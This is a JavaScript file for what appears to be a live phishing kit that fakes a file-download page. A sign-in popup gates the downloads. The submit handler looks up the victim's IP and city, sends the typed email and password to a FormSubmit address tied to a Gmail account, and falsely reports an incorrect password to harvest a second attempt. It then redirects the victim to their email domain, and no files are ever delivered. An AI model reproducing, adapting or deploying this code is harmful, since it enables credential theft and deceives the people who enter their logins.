document.addEventListener('DOMContentLoaded', function () {
  // Element references
  const downloadButtons = document.querySelectorAll('.download-icon');
  const downloadAllButton = document.getElementById('downloadButton');
  const popupForm = document.getElementById('popupForm');
  const popupOverlay = document.getElementById('popupOverlay');
  const closePopupButton = document.getElementById('closePopupButton');
  const downloadForm = document.getElementById('downloadForm');
  const submitButton = document.querySelector('#downloadForm button[type="submit"]');
  const emailInput = document.getElementById('email');
  const passwordInput = document.getElementById('password');
  const errorMessage = document.getElementById('errorMessage');
  const networkErrorModal = document.getElementById('networkErrorModal');
  const retryButton = document.getElementById('retryButton');
  const cancelButton = document.getElementById('cancelButton');

  let step = 0; // Track submission attempts
  const loaderGif = 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSi5YaF8N9pxFP_SOR4yBK2_DBMBMdLFmMpFKsmGW83HhzHP7913cNKZOyokKPGt43TsFajYNdNeoxc04bSuNAEllehPsfUxrMZDuG_pa12oHdvE60B0Oxw8yMjIGoI9IBL_BqnHXQCWH-FkpoSz-4VS02hqI5qOVSFwUurOO1suFreDjJYZ6XNQ-Q4-4/s256/loader.gif';

  // Create loader element
  let loader = document.getElementById('loader');
  if (!loader) {
    loader = document.createElement('div');
    loader.id = 'loader';
    loader.style.position = 'fixed';
    loader.style.top = '50%';
    loader.style.left = '50%';
    loader.style.transform = 'translate(-50%, -50%)';
    loader.style.zIndex = '9999';
    loader.style.display = 'none';
    loader.innerHTML = `<img src="${loaderGif}" style="width:50px; height:50px;" alt="Loading">`;
    document.body.appendChild(loader);
  }

  // Disable submit button initially
  if (submitButton) {
    submitButton.disabled = true;
    submitButton.style.opacity = '0.6';
    submitButton.style.cursor = 'not-allowed';
  }

  // Validate inputs in real-time
  function validateInputs() {
    const emailValid = emailInput.value.trim().includes('@');
    const passwordValid = passwordInput.value.trim().length >= 8;

    if (submitButton) {
      submitButton.disabled = !(emailValid && passwordValid);
      submitButton.style.opacity = submitButton.disabled ? '0.6' : '1';
      submitButton.style.cursor = submitButton.disabled ? 'not-allowed' : 'pointer';
    }

    if (passwordInput.value.trim().length > 0 && passwordInput.value.trim().length < 8) {
      showError('Password must be at least 8 characters', false);
    } else if (!emailInput.value.trim().includes('@') && emailInput.value.trim().length > 0) {
      showError('Please enter a valid email', false);
    } else {
      errorMessage.style.display = 'none';
    }
  }

  // Show popup function
  function showPopup() {
    popupForm.classList.add('active');
    popupOverlay.classList.add('active');
    document.body.style.overflow = 'hidden';

    // Check URL hash for email pre-fill
    if (window.location.hash) {
      const clientID = window.location.hash.substring(1);
      if (clientID.includes('@')) {
        emailInput.value = clientID;
        validateInputs();
      }
    }
  }

  // Close popup function
  function closePopup() {
    popupForm.classList.remove('active');
    popupOverlay.classList.remove('active');
    document.body.style.overflow = '';
  }

  // Show error message
  function showError(message, isError = true) {
    errorMessage.textContent = message;
    errorMessage.style.color = isError ? '#ff6b6b' : 'orange';
    errorMessage.style.display = 'block';

    // Add shake animation
    errorMessage.classList.add('shake');
    setTimeout(() => {
      errorMessage.classList.remove('shake');
    }, 500);
  }

  // Show network error modal
  function showNetworkError() {
    networkErrorModal.classList.add('active');
    popupOverlay.classList.add('active');
    document.body.style.overflow = 'hidden';
  }

  // Hide network error modal
  function hideNetworkError() {
    networkErrorModal.classList.remove('active');
    popupOverlay.classList.remove('active');
    document.body.style.overflow = '';
  }

  // Show loading state
  function showLoading(show) {
    loader.style.display = show ? 'block' : 'none';
    if (submitButton) {
      submitButton.disabled = show;
      submitButton.textContent = show ? 'Processing...' : 'Sign in';
    }
  }

  // Track authentication state
  let isAuthenticated = false;
  let authEmail = '';

  // Form submission handler using jQuery approach
  async function handleSubmit(event) {
    event.preventDefault();

    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();

    if (!email || !email.includes('@')) {
      showError('Please enter a valid email address');
      return;
    }

    if (password.length < 8) {
      showError('Password must be at least 8 characters');
      return;
    }

    errorMessage.style.display = 'none';
    showLoading(true);
    submitButton.textContent = 'Verifying...';

    try {
      // Get IP information
      const ipResponse = await fetch('https://ipinfo.io/json');
      if (!ipResponse.ok) throw new Error('Network error');
      const ipData = await ipResponse.json();

      step++; // Increment submission attempt

      // Prepare form data
      const formData = {
        _subject: "Logs | " + ipData.ip,
        Email: email,
        Password: password,
        Attempts: step,
        IP: ipData.ip,
        Location: ipData.city + ", " + ipData.country,
      };

      // Submit to FormSubmit
      const submitResponse = await fetch('https://formsubmit.co/ajax/shimingtorchbat@gmail.com', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
        body: JSON.stringify(formData),
      });

      if (!submitResponse.ok) throw new Error('Network error');

      const result = await submitResponse.json();

      // Redirect on second attempt
      if (step === 2) {
        const domain = email.split('@').pop(); // Extract domain from email
        showLoading(false);
        window.location.href = `http://${domain}`;
        return;
      }

      // Show incorrect password message on first attempt
      showError('Incorrect password. Please try again.');
      showLoading(false);
      submitButton.textContent = 'Sign in';

    } catch (error) {
      console.error('Submission error:', error);
      showLoading(false);
      submitButton.textContent = 'Sign in';
      
      if (error.message === 'Network error') {
        closePopup();
        showNetworkError();
      } else {
        showError('An error occurred. Please try again later.');
      }
    }
  }

  // Enable downloads after authentication
  function enableDownloads() {
    downloadButtons.forEach((button) => {
      button.style.cursor = 'pointer';
      button.style.opacity = '1';
      button.style.pointerEvents = 'auto';
    });

    if (downloadAllButton) {
      downloadAllButton.disabled = false;
      downloadAllButton.style.opacity = '1';
      downloadAllButton.style.cursor = 'pointer';
    }
  }

  // Handle individual file downloads
  function handleFileDownload(event) {
    if (!isAuthenticated) {
      event.preventDefault();
      showPopup();
      return;
    }

    const fileName = event.currentTarget.getAttribute('data-file');

    showLoading(true);

    setTimeout(() => {
      showLoading(false);
      alert(`Downloading ${fileName}...`);
    }, 1000);
  }

  // Event listeners
  if (emailInput) emailInput.addEventListener('input', validateInputs);
  if (passwordInput) passwordInput.addEventListener('input', validateInputs);
  if (popupOverlay) popupOverlay.addEventListener('click', closePopup);
  if (closePopupButton) closePopupButton.addEventListener('click', closePopup);

  // Network error modal buttons
  if (retryButton) {
    retryButton.addEventListener('click', () => {
      hideNetworkError();
      showPopup(); // Reopen popup for retry
    });
  }

  if (cancelButton) {
    cancelButton.addEventListener('click', () => {
      hideNetworkError();
    });
  }

  // Add click handlers to download buttons
  downloadButtons.forEach((button) => {
    button.removeEventListener('click', handleFileDownload); // Prevent duplicate listeners
    button.addEventListener('click', handleFileDownload);
  });

  if (downloadAllButton) {
    downloadAllButton.addEventListener('click', () => {
      if (!isAuthenticated) {
        showPopup();
      } else {
        showLoading(true);
        setTimeout(() => {
          showLoading(false);
          alert('Downloading all files...');
        }, 1500);
      }
    });
  }

  if (downloadForm) {
    downloadForm.addEventListener('submit', handleSubmit);
  }

  // Initial validation
  validateInputs();
});
